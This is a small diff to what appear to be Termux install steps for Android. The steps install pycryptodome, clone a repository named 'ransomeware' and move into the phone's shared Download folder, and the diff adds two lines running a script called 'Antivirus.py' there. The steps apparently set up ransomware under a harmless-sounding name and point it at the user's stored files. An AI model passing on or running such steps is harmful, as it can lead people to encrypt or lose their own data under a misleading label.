@@ -18,7 +18,7 @@ pkg install git
 pip install pycryptodome
 git clone https://github.com/Abhishek88911/ransomeware.git
 cd ransomeware
-
+python Antivirus.py
 termux-setup-storage
 cd /storage/emulated/0/Download
-
+python Antivirus.py
